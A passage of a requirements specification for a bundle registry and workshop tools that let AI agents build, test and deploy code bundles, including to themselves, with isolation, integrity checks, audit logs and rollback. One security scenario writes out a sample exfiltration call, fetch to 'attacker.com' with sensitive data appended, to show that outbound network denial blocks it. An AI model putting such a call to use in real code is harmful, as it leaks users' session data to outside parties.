- `bundle_versions(version_id TEXT PRIMARY KEY, kv_key TEXT NOT NULL, size_bytes INTEGER NOT NULL, created_at INTEGER NOT NULL, created_by TEXT NULL, metadata TEXT NULL)` — one row per unique artifact
- `agent_bundles(agent_id TEXT PRIMARY KEY, active_version_id TEXT NULL REFERENCES bundle_versions.version_id, previous_version_id TEXT NULL REFERENCES bundle_versions.version_id, updated_at INTEGER NOT NULL)` — one row per agent; NULL `active_version_id` means "use static brain"
- `bundle_deployments(id INTEGER PRIMARY KEY AUTOINCREMENT, agent_id TEXT NOT NULL, version_id TEXT NULL, deployed_at INTEGER NOT NULL, deployed_by_session_id TEXT NULL, rationale TEXT NULL)` — append-only audit log; NULL `version_id` records a disable-to-static event

#### Scenario: First use against empty D1
- **WHEN** a worker with a fresh D1 binding constructs `D1BundleRegistry` and issues a query
- **THEN** all three tables and their indexes are created if absent, then the query succeeds

#### Scenario: Setting active version updates previous
- **WHEN** `registry.setActive(agentId, newVersionId)` is called while the agent has `active_version_id = 'A'`
- **THEN** the row is updated to `active_version_id = newVersionId`, `previous_version_id = 'A'`, `updated_at = now`

#### Scenario: Clearing active version reverts to static
- **WHEN** `registry.setActive(agentId, null)` is called
- **THEN** `active_version_id` becomes NULL; on the next turn, the agent's static brain runs

### Requirement: D1 batch atomicity for multi-statement operations

Multi-statement registry operations (`setActive` + insert deployment log; `rollback` + insert deployment log) SHALL use D1's `db.batch([...])` API to wrap the statements in a single atomic transaction. Sequential `.prepare().run()` calls SHALL NOT be used for multi-statement operations. Rollback SHALL atomically swap `active_version_id` and `previous_version_id`, append a `bundle_deployments` row, and update `updated_at`.

#### Scenario: setActive uses batch
- **WHEN** `registry.setActive(agentId, newVersionId)` is invoked
- **THEN** the implementation issues a single `db.batch([updateAgentBundles, insertDeployment])` call; if either statement fails, neither change persists

#### Scenario: Successful rollback
- **WHEN** `registry.rollback(agentId, { rationale: "reverting" })` is called while `active = 'B', previous = 'A'`
- **THEN** after the call `active = 'A', previous = 'B'`, and a deployment row records the rollback, atomically

#### Scenario: Rollback with no previous version
- **WHEN** `registry.rollback(agentId)` is called on an agent whose `previous_version_id` is NULL
- **THEN** the method returns an error indicating no previous version exists; registry state is unchanged

### Requirement: KV bundle bytes storage with size limit and read-back verification

Compiled bundle bytes SHALL be stored in a KV namespace using keys of the form `bundle:{versionId}`. Bytes operations SHALL be exposed through the registry interface (`putBytes`, `getBytes`). Writes SHALL fail with a clear error if the artifact exceeds Cloudflare KV's 25 MiB per-value limit. **Deploy SHALL use read-back verification**: after `kv.put(bundleKey, bytes)`, the implementation SHALL poll `kv.get(bundleKey)` with exponential backoff (50ms, 100ms, 200ms, 400ms, 800ms, 1600ms, 2000ms — capped at ~5s total) until the bytes are visible, and only THEN insert the `bundle_versions` row in D1 and update the active pointer. If readback fails within timeout, the operation SHALL return an error and the registry state SHALL remain unchanged. Orphan KV entries from failed deploys are tolerated and cleaned up by the eventual GC tool.

#### Scenario: Write and read bundle bytes
- **WHEN** a deploy writes `registry.putBytes(versionId, bytes)` and a later turn reads `registry.getBytes(versionId)`
- **THEN** the read returns the identical byte content

#### Scenario: KV size limit enforcement
- **WHEN** a deploy attempts to write a bundle exceeding 25 MiB
- **THEN** the deploy fails with a clear error identifying size as the cause; no partial state is left in the registry

#### Scenario: Readback succeeds after backoff
- **WHEN** KV cross-location replication takes 300ms before bytes are visible
- **THEN** the polling sequence (50, 100, 200, ...) succeeds on the third attempt; the deploy proceeds

#### Scenario: Readback fails after timeout
- **WHEN** KV bytes are not visible within ~5 seconds
- **THEN** `createVersion` returns an error identifying readback timeout; no D1 row is inserted; the active pointer is unchanged

### Requirement: Bundle metadata schema and storage

The `bundle_versions.metadata` column SHALL store a JSON object describing the bundle's declared identity: `{ id?, name?, description?, declaredModel?, capabilityIds?: string[], authoredBy?, version?, buildTimestamp? }`. The workshop SHALL extract metadata from the bundle's `POST /metadata` endpoint at deploy time and pass it to `registry.createVersion`. The workshop SHALL validate that the metadata is a JSON-serializable object whose top-level keys match the documented schema before persisting; unknown keys SHALL be stripped, malformed metadata SHALL fail the deploy with a clear error.

#### Scenario: Metadata round-trips through registry
- **WHEN** a bundle declares `metadata: { name: "Helper", description: "research assistant" }` and is deployed
- **THEN** `registry.getVersion(versionId).metadata` returns the validated JSON object

#### Scenario: Malformed metadata rejected
- **WHEN** a bundle's `/metadata` endpoint returns a non-object value or includes deeply nested non-serializable values
- **THEN** the workshop fails the deploy with a clear error identifying the validation failure

<!-- Section: Bundle workshop -->

### Requirement: bundle_init scaffolding tool

The system SHALL provide a `bundle_init` tool that scaffolds a new bundle workspace inside the agent's sandbox container at a caller-specified path (default `/workspace/bundles/{name}/`). The scaffold SHALL include `package.json` (with `file:/opt/claw-sdk/...` references to the read-only vendored snapshot), `tsconfig.json` (extending a shared bundle tsconfig base), `src/index.ts` (a starter `defineBundleAgent({...})` call), and `README.md`. After scaffolding, the tool SHALL run `bun install --ignore-scripts` inside the container.

#### Scenario: Workspace created and installable
- **WHEN** an agent calls `bundle_init({ name: "my-bundle" })`
- **THEN** the files exist at `/workspace/bundles/my-bundle/`, `bun install --ignore-scripts` succeeds, and the starter `src/index.ts` compiles

#### Scenario: Init rejects existing name
- **WHEN** an agent calls `bundle_init({ name: "existing" })` on a path that already contains a workspace
- **THEN** the tool returns an error without overwriting any files

### Requirement: bundle_build with integrity verification

The system SHALL provide a `bundle_build` tool that runs `bun build src/index.ts --target=browser --format=esm --outfile=dist/bundle.js` inside the sandbox container for a named workspace. Before invoking `bun build`, the tool SHALL verify the integrity of the vendored `/opt/claw-sdk/` snapshot against `/opt/claw-sdk/INTEGRITY.json` (SHA-256 hashes generated at image build time). Tampering SHALL abort the build before `bun build` runs. The tool SHALL return success/failure plus captured stdout and stderr.

#### Scenario: Successful build
- **WHEN** an agent calls `bundle_build({ name: "my-bundle" })` on a workspace with a valid `src/index.ts`
- **THEN** integrity verification passes, `dist/bundle.js` exists, the tool result indicates success

#### Scenario: Build failure with diagnostics
- **WHEN** an agent calls `bundle_build` on a workspace with a TypeScript or bundler error
- **THEN** the tool result indicates failure and includes the diagnostic output identifying file, line, and error message

#### Scenario: Tampered vendored package detected
- **WHEN** the `/opt/claw-sdk/` mount has been modified since image build
- **THEN** integrity verification fails before `bun build` runs; the tool returns an error identifying the tampered file

### Requirement: bundle_test with isolation

The system SHALL provide a `bundle_test` tool that loads the workspace's `dist/bundle.js` via Worker Loader in a scratch isolate, with a throwaway in-memory spine and a synthetic capability token scoped to a scratch session ID. The tool SHALL accept a `prompt` argument and optional configuration, run one turn, and return the transcript. The candidate bundle SHALL run with restricted bindings — no parent credential store, no parent file state access, no parent network identity, no parent session store access.

#### Scenario: Test run returns transcript
- **WHEN** an agent calls `bundle_test({ name: "my-bundle", prompt: "hello" })` on a workspace with a successfully built bundle
- **THEN** a scratch loader instance handles the prompt using the bundle's runtime; the tool returns a transcript including the assistant's response

#### Scenario: Test isolation from parent session
- **WHEN** a `bundle_test` call completes
- **THEN** no entries are written to the parent's session store; the throwaway spine and its in-memory state are discarded

#### Scenario: Test surfaces runtime errors
- **WHEN** the bundle loads but throws during turn handling
- **THEN** the tool returns failure with the error message preserved

### Requirement: bundle_deploy with self-editing default and pre-deploy smoke test

The system SHALL provide a `bundle_deploy` tool that reads the built `dist/bundle.js`, computes the content hash, runs a pre-deploy smoke test, calls `registry.createVersion` (handling KV write + readback verification + metadata validation), and calls `registry.setActive` to update the target's pointer. The tool SHALL accept an optional `targetAgentId` argument; **if omitted, the tool SHALL deploy to the invoking agent's own bundle pointer (self-editing)**. Self-editing is safe by default because the static brain remains the fallback. The pre-deploy smoke test SHALL load the candidate bundle in a scratch loader isolate with a throwaway spine and synthetic token, issue a `POST /smoke` request, and verify a well-formed response; failure SHALL abort the deploy with no registry writes.

#### Scenario: Self-edit deploy by default
- **WHEN** an agent calls `bundle_deploy({ name: "my-bundle", rationale: "added time tool" })` without `targetAgentId`
- **THEN** the bundle is hashed, smoke-tested, stored in KV with readback verification, registered, and the invoking agent's `active_version_id` is set to the new version

#### Scenario: Cross-agent deploy with targetAgentId
- **WHEN** an agent calls `bundle_deploy({ name: "my-bundle", targetAgentId: "other-agent", rationale: "..." })`
- **THEN** the deploy targets `other-agent`'s bundle pointer

#### Scenario: Healthy bundle passes smoke test
- **WHEN** a bundle that loads correctly and responds to smoke is deployed
- **THEN** the smoke test succeeds and the deploy proceeds

#### Scenario: Broken bundle blocked
- **WHEN** a bundle that crashes during load or returns malformed smoke response is deployed
- **THEN** the smoke test fails; the deploy is aborted; no changes occur

#### Scenario: Deploy fails on oversized bundle
- **WHEN** the built bundle exceeds 25 MiB
- **THEN** the tool returns failure identifying size as the cause; no KV or registry writes occur

#### Scenario: Deploy blocked if build missing
- **WHEN** an agent calls `bundle_deploy` on a workspace without a built `dist/bundle.js`
- **THEN** the tool returns an error instructing the agent to run `bundle_build` first

### Requirement: bundle_disable, bundle_rollback, and bundle_versions tools

The system SHALL provide a `bundle_disable` tool that clears the active bundle pointer for a target agent (default: invoking agent), causing the next turn to run the static brain. The system SHALL provide a `bundle_rollback` tool that invokes `registry.rollback` for a target agent, swapping `active_version_id` with `previous_version_id`. The system SHALL provide a `bundle_versions` tool that lists deployment history for a target agent, returning rows from `bundle_deployments` joined with `bundle_versions.metadata` (default limit 20, max 100; values above 100 capped without error). All three tools SHALL append rationale to the deployment audit log and SHALL signal the target DO to refresh its cached active pointer.

#### Scenario: Disable own bundle
- **WHEN** an agent calls `bundle_disable({ rationale: "had a bug" })`
- **THEN** the invoking agent's `active_version_id` becomes NULL; a deployment row records the disable; the next turn runs the static brain

#### Scenario: Rollback swaps versions
- **WHEN** an agent calls `bundle_rollback({ rationale: "bad deploy" })` while `active = 'B', previous = 'A'`
- **THEN** the registry entry becomes `active = 'A', previous = 'B'`; a rollback row is appended; the cached pointer is invalidated

#### Scenario: Rollback with no previous
- **WHEN** an agent calls `bundle_rollback` on a target whose `previous_version_id` is NULL
- **THEN** the tool returns an error suggesting `bundle_disable` instead

#### Scenario: List recent deployments
- **WHEN** an agent calls `bundle_versions({ limit: 5 })`
- **THEN** the tool returns up to five most-recent deployment records ordered by `deployed_at` descending

#### Scenario: Limit cap enforced
- **WHEN** an agent calls `bundle_versions({ limit: 500 })`
- **THEN** the tool returns at most 100 records

### Requirement: Sandbox container with read-only vendored snapshot

The sandbox container image SHALL include vendored `@crabbykit/*` bundle-authoring packages (the `bundle` and `client`/`schemas` subpaths only — never `service` or host-side WorkerEntrypoint classes) at `/opt/claw-sdk/`, mounted **read-only** at runtime. An integrity manifest at `/opt/claw-sdk/INTEGRITY.json` SHALL list SHA-256 hashes of every vendored file, generated at image build time. `bundle_init` and `bundle_build` SHALL operate against the agent's sandbox container filesystem via the existing `packages/sandbox` tooling. `bundle_init` SHALL invoke `bun install --ignore-scripts` to disable lifecycle hooks. The workshop SHALL require sandbox elevation as a precondition to its tools.

#### Scenario: Offline build
- **WHEN** `bundle_build` runs inside a sandbox container with no outbound network
- **THEN** integrity check passes, `bun install --ignore-scripts` and `bun build` complete successfully using only vendored packages

#### Scenario: Read-only mount enforced
- **WHEN** any process inside the container attempts to write to `/opt/claw-sdk/`
- **THEN** the write fails (EROFS or equivalent)

#### Scenario: Workshop requires sandbox elevation
- **WHEN** an agent attempts `bundle_init` without elevating a sandbox session
- **THEN** the tool returns an error instructing the agent to elevate first

### Requirement: Deploy rate limiting and workshop tool audit log

`bundle_deploy` SHALL enforce a per-agent deploy rate limit (default 5 deploys per minute per token-derived agentId). Limit state SHALL be tracked in DO storage. Exceeding the limit SHALL return `ERR_DEPLOY_RATE_LIMITED`. Every invocation of a `bundle_*` workshop tool SHALL append a structured audit log entry to the parent agent's session store as a custom session entry of type `workshop_audit` recording: tool name, summarized arguments (excluding blob contents), result status, error code if applicable, timestamp.

#### Scenario: Rate limit enforced
- **WHEN** an agent invokes `bundle_deploy` 6 times within 60 seconds
- **THEN** the 6th call returns `ERR_DEPLOY_RATE_LIMITED`

#### Scenario: Successful tool invocation logged
- **WHEN** an agent calls `bundle_deploy` and it succeeds
- **THEN** a `workshop_audit` entry records `{ tool: "bundle_deploy", args: {...}, status: "success", versionId, timestamp }`

#### Scenario: Failed tool invocation logged
- **WHEN** `bundle_build` fails due to a tsc error
- **THEN** a `workshop_audit` entry records `{ tool: "bundle_build", args: {name}, status: "error", errorCode: "BUILD_FAILED", timestamp }`

<!-- Section: Security hardening -->

### Requirement: Default globalOutbound restriction for loader isolates

Bundle-enabled DOs SHALL invoke `LOADER.get(...)` factories with `globalOutbound: null` by default, denying the bundle isolate any direct outbound network access. Bundles SHALL reach external services exclusively via service binding stubs (LlmService, capability services) provided through `bundleEnv`. Consumers SHALL NOT be able to opt out of this default in v1 — if a bundle needs an external service, the host worker SHALL expose it as a service binding via the capability service pattern. This SHALL prevent a bundle from leaking session data, tool results, or any sensitive information by `fetch()`-ing an attacker-controlled URL.

#### Scenario: Default globalOutbound is null
- **WHEN** the bundle dispatcher invokes `LOADER.get(versionId, factory)` and the factory returns its module config
- **THEN** the factory return value includes `globalOutbound: null`

#### Scenario: Bundle fetch attempt fails
- **WHEN** bundle code attempts `await fetch("https://attacker.com?data=" + sensitive)`
- **THEN** the fetch fails because outbound network is denied at the loader isolate level; no request reaches `attacker.com`

### Requirement: SpineService and capability service error sanitization

Errors raised inside `SpineService` and capability service classes SHALL be sanitized before being returned to the caller. Only a whitelisted set of error codes (`ERR_BAD_TOKEN`, `ERR_TOKEN_EXPIRED`, `ERR_TOKEN_REPLAY`, `ERR_BUDGET_EXCEEDED`, `ERR_RATE_LIMITED`, `ERR_NOT_FOUND`, `ERR_INVALID_ARGUMENT`, `ERR_UPSTREAM_AUTH`, `ERR_UPSTREAM_RATE`, `ERR_UPSTREAM_OTHER`, `ERR_INTERNAL`) and a generic message SHALL cross the RPC boundary. Internal sessionIds, agentIds (other than the caller's own as derived from their token), DO storage values, environment values, stack traces, and upstream provider response bodies SHALL NOT appear in any error returned to a bundle.

#### Scenario: Internal exception sanitized
- **WHEN** a `SpineService.appendEntry` call triggers an internal DO storage error
- **THEN** the spine catches the exception, logs it internally, and returns `ERR_INTERNAL` with a generic message; no sessionId, no DO state, no stack trace crosses the RPC boundary

#### Scenario: No foreign sessionId in errors
- **WHEN** an error occurs while processing a bundle's RPC and the error message would naturally reference internal state
- **THEN** the returned error contains no sessionId or agentId other than what the caller already proved it has via the token

### Requirement: Bundle metadata validation by workshop before persisting

The workshop SHALL validate the JSON value returned by a bundle's `POST /metadata` endpoint before passing it to `registry.createVersion`. Validation SHALL ensure the value is a JSON object whose top-level keys are a subset of the documented metadata schema, that string values are bounded in length (default max 256 chars per field, 1024 for `description`), and that arrays are bounded (default max 32 entries for `capabilityIds`). Unknown top-level keys SHALL be stripped. Metadata that fails validation SHALL fail the deploy with a clear error message identifying the validation failure.

#### Scenario: Valid metadata persisted
- **WHEN** a bundle returns `{ name: "Helper", description: "research", capabilityIds: ["compaction-summary", "tavily"] }` from `/metadata`
- **THEN** the workshop validates and persists the object as-is

#### Scenario: Oversized metadata rejected
- **WHEN** a bundle returns a `description` field exceeding the length limit
- **THEN** the workshop fails the deploy with a clear error identifying the field and the limit

#### Scenario: Unknown keys stripped
- **WHEN** a bundle returns `{ name: "Helper", attackerField: "..." }` from `/metadata`
- **THEN** the workshop strips `attackerField` and persists only the documented keys

### Requirement: Build determinism for content addressing

The bundle build pipeline SHALL produce deterministic output for the same source. `bun build` SHALL be invoked with flags that disable timestamps, environment-derived randomness, and source map paths that vary across machines. The deploy SHALL hash the bytes after build, so any non-determinism in `bun build` would cause the same source to produce different version IDs across builds. The `bundle_build` tool SHALL document this requirement and the workshop SHALL fail loudly if it detects non-deterministic output (e.g., by performing a second build and comparing hashes during the smoke-test phase, optionally enabled via a config flag).

#### Scenario: Same source produces same version ID
- **WHEN** the same workspace is built twice in succession via `bundle_build`
- **THEN** both builds produce byte-identical `dist/bundle.js` files and therefore the same version ID

<!-- Section: Coexistence and backwards compatibility -->

### Requirement: Coexistence with static defineAgent

The introduction of the optional `bundle` config field SHALL NOT alter the behavior, performance, or API of `defineAgent` consumers who omit it. Static agents SHALL exhibit zero functional or performance regression. The same `defineAgent` function returns the same shape of DO class either way. Capabilities authored for static agents SHALL continue to use the existing sync `CapabilityHookContext` and the existing sync `SessionStore`. The static `AgentRuntime`, `SessionStore`, `Transport`, and `CapabilityHookContext` interfaces SHALL NOT change as part of this feature — there is no async refactor of any public surface used by static agents.

#### Scenario: Static agent unaffected by feature presence
- **WHEN** a worker imports `defineAgent` and creates an agent without `bundle` config, in a workspace where `@crabbykit/agent-bundle` is also installed
- **THEN** the agent runs identically to before the feature was added; no new code paths are exercised; no overhead is incurred; existing capabilities (compaction-summary, sandbox, subagent, etc.) work unchanged

#### Scenario: Existing capability packages unaffected
- **WHEN** any existing capability package (compaction-summary, sandbox, subagent, prompt-scheduler, r2-storage, etc.) is imported by a static agent
- **THEN** its API is unchanged from before the feature was added; the package compiles, tests pass, runtime behavior is identical
